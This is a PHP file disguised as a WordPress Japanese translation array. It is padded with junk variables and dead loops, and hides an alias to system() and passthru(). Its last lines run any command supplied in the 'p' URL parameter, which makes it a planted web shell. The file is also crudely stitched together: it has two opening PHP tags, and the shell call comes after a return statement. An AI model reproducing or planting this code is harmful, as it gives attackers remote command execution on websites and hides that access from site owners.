<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
return ['domain'=>NULL,'plural-forms'=>'nplurals=2; plural=n != 1;','messages'=>['html_lang_attribute'=>'ja','text directionltr'=>'ltr','number_format_decimal_point'=>'number_format_decimal_point','number_format_thousands_sep'=>'number_format_thousands_sep','Update %s now'=>'今すぐ %s を更新','Word count type. Do not translate!words'=>'characters_including_spaces','excerpt_length55'=>'110','comment_excerpt_length20'=>'40','draft_length10'=>'40'],'language'=>'ja_JP','x-generator'=>'Poedit 1.8.10'];
$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>